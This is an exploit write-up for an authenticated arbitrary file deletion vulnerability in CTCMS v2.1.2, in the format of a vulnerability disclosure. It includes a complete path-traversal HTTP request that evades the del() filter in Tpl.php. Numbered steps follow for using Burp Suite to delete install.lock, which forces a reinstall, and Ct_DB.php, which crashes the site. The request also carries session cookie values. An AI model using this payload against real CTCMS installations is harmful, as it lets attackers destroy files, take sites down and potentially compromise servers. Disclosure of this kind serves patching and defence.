**Exploit Title: CTCMS Arbitrary File Deletion Vulnerability (Authenticated)**

**Version: CTCMS v2.1.2**

**Google Dork: N/A**

**Date: 04/28/2025**

**Tested on: Apache2.4, MySQL5.7, PHP7.0**

**Software Link: https://www.ctcms.cn/**

**Description: CTCMS contains an arbitrary file deletion vulnerability in the del() function located in ctcms\apps\controllers\admin\Tpl.php. The function improperly sanitizes user input by stripping .. and //, but this can be bypassed using combinations of ./ and ../. An attacker can craft payloads to traverse outside the intended directory and delete arbitrary files on the server, such as critical configuration files (config.php), sensitive data files, or even core system files like install.lock. Deleting these files can cause the website to crash, force a system reinstallation, expose sensitive information, or even lead to complete system compromise, making this a highly critical vulnerability.**
![image](https://github.com/user-attachments/assets/58343984-9a95-4171-b123-d5e704b9d184)

**Payload used:**
```
GET /admin.php?c=tpl&m=del&file=./../././../././../././../././../././../././../././.././xp/www/caches/install.lock HTTP/1.1
Host: 192.168.153.131
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://192.168.153.131/admin.php
Cookie: xp=MTc0NTc3MTQ0NXxEWDhFQVFMX2dBQUJFQUVRQUFBcF80QUFBUVp6ZEhKcGJtY01Dd0FKVTJGbVpVVnVkSEo1Qm5OMGNtbHVad3dJQUFaaE9HTXhZelk9fLfXy9K7NUGqvBUsEOTgtwOD7EjQk0skM9Tqng5AChpr; admin_id=1; admin_login=7794edacfeda974d8f8573596718281a; admin_logip=%E6%9C%AA%E7%99%BB%E9%99%86; admin_logtime=%E6%9C%AA%E7%99%BB%E9%99%86; ctcms_=hbhr9e4gijf3rvou9n7funciuo
Upgrade-Insecure-Requests: 1
Priority: u=4
Pragma: no-cache
Cache-Control: no-cache
```
**Exampleï¼š**
1.Log in to the management backend and navigate to the template management section.

![image](https://github.com/user-attachments/assets/a3a56845-012c-4af9-a444-31ce171c5c6d)

2.Select an HTML template to delete, then use Burp Suite (or a similar tool) to intercept and modify the request. Change the file parameter to point to a sensitive ```file```, such as ./../././../././../././.././install.lock.

![image](https://github.com/user-attachments/assets/db637a5f-e2c8-48e8-9ea4-c4c4a1511afc)

3.After successfully deleting the file, visit the website, which will trigger the installation wizard due to the missing install.lock file, indicating that the website is attempting to reinstall.
![image](https://github.com/user-attachments/assets/dd17bd39-5976-4e8c-b251-dfb7012f8832)

4.Now, modify the payload to target a critical file such as Ct_DB.php, and delete it. Afterward, when visiting the website, it will display a blank page due to the absence of the Ct_DB.php file, causing the website to crash.

![image](https://github.com/user-attachments/assets/fb81e7b9-9c74-4663-86e5-918b0faaa35c)

![image](https://github.com/user-attachments/assets/2705eb29-f474-403e-8e65-b186f4187487)
